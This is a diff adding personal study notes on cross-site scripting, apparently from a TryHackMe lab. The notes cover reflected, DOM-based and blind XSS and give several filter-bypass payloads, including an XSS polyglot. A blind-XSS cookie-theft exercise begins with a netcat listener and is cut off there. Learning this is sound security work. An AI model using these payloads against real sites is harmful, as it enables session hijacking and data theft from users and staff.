@@ -25,6 +25,82 @@ Reflected XSS:
     How to test for Relected XSS?
         * Test every possible point of entry. Params in URL query string, URL file path, HTTP headers (likely difficult to exploit).
         * Once you find data being reflected in the web app, need to confirm payload can be ran successfully.
+        * Devs can think validating input on client side is enough. Hence resend with unexpected values can bypass.
 
 
-NEED TASK 4 notes onwards!
+DOM based XSS: (Document Object Model) 
+    - Check out https://www.w3.org/TR/REC-DOM-Level-1/introduction.html to learn more.
+    * DOM is a programming interface for HTML & XML docs. Represents the page, allows for changes in style, structure & content.
+    * e.g web page is a document, can be displayed in browser or as HTML code. 
+
+    Exploiting DOM: 
+        * DOM based XSS is where the JS execution happens in browser without any new pages being loaded/ data submitted to back end code.
+        * E.g The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page.
+        * The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
+
+    IMPACT:
+        * crafted links sent to victims, redirected to another website or steal contents from the page/ user session.
+    
+    HOW TO TEST FOR DOM?    
+        * Can be difficult. Requires understanding of JS source code.
+        * Look for parts of the code that access attacker controlled variables. (such as window.location.x param)
+        * Check the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().
+    
+BLIND XSS:
+    * Similar to stored xss (malicious code stored on web page, executed by others), except can't see payload working, can't test on self.
+
+    Example: 
+        - Website has a contact form to message staff. Input is not checked for malicious code.
+        - These messages get turned into tickets, viewed by staff on a private web portal.
+    
+    IMPACT:
+        - Attacker's JS could make calls back to owned website. Reveals staff portal URL, its code, staff cookies.
+        - Attacker could then hijack staff member's session and access private portal.
+    
+    HOT TO TEST FOR BLIND XSS:
+        * Popular tool for blind XSS: https://github.com/mandatoryprogrammer/xsshunter-express
+
+PERFECTING THE PAYLOAD:
+    * Payload is what we want ran on users browser, or proof of concept XSS vuln.
+    * Payload intentions could be displaying a JS alert, hijacking user session tokens or stealing website data.
+
+    Challenges:
+    1. Form prints user input. Name reflected in source code. <script>alert('THM');</script> input gives alert "THM"
+
+    2. Input gets reflected in an input tag (<input value =chr>). Therefore to escape input tag.
+        --> "><script>alert('THM');</script>        "> closes the value parameter, closing the input tag. script is now executed.
+
+    3. Name reflected in an input tag, this time <textarea>
+        --> </textarea><script>alert('THM');</script>        </textarea> closes the input tag.
+
+    4. Source code shows we are within a JS command (<script>document.getElement...'chris'<>). Need to escape command
+        --> ';alert('THM');//           ' closes field name, ; signifies end of command. // makes everything after a comment, not exec code.
+
+    5. Input validation. after input of typical script, following pops up: Hello, <>alert('THM');
+        <script> is being removed!
+        
+    ***STRING TRICK: If 'script' is being removed try 'sscriptcript'
+        want: <script>alert('THM');</script>
+        do: <sscriptcript>alert('THM');</sscriptcript>
+
+    6. 'Enter an image path' ==> must escape input tag again.  trying "><script>alert('THM');</script>  doesnt work
+        Why? "><script>alert('THM');</script    ---reflected--->     <img src="" scriptalert('thm');="" script"="">
+        '<' and '>' get filtered! Therefore need to leverage other attributes of IMG tag.
+        **The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.
+        * Therefore change payload to /images/cat.jpg" onload="alert('THM');    ---reflects---> /images/cat.jpg" onload="alert('THM');
+
+    XSS POLYGLOTS:
+        * String of text that can escape attributes, tags and bypass filters in one. The following:
+        ***jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+        Would work for all 6 examples.
+
+BLIND XSS PRACTICAL:
+    * Attacking Acme IT again. Create an account and check out 'Support tickets' tab for XSS vulns. Create test ticket.
+    * Inspect source to see how test ticket reflected. ---> <textarea class="form-control">testcontents</textarea>
+    * Trying to escape <textarea> tag: </textarea>test ---> <textarea class="form-control"></textarea> test (visual, outside input box)
+    * Running  </textarea><script>alert('THM');</script> ---->  Alert pops up. Proof of concept.
+
+    - Now, expand. We know staff will view, potentially executing the JS script. lets get cookies!
+    - To hijack session, need to run a listening server (Netcat!). nc -l -p 9001    where -1 means listen
+    - 
+
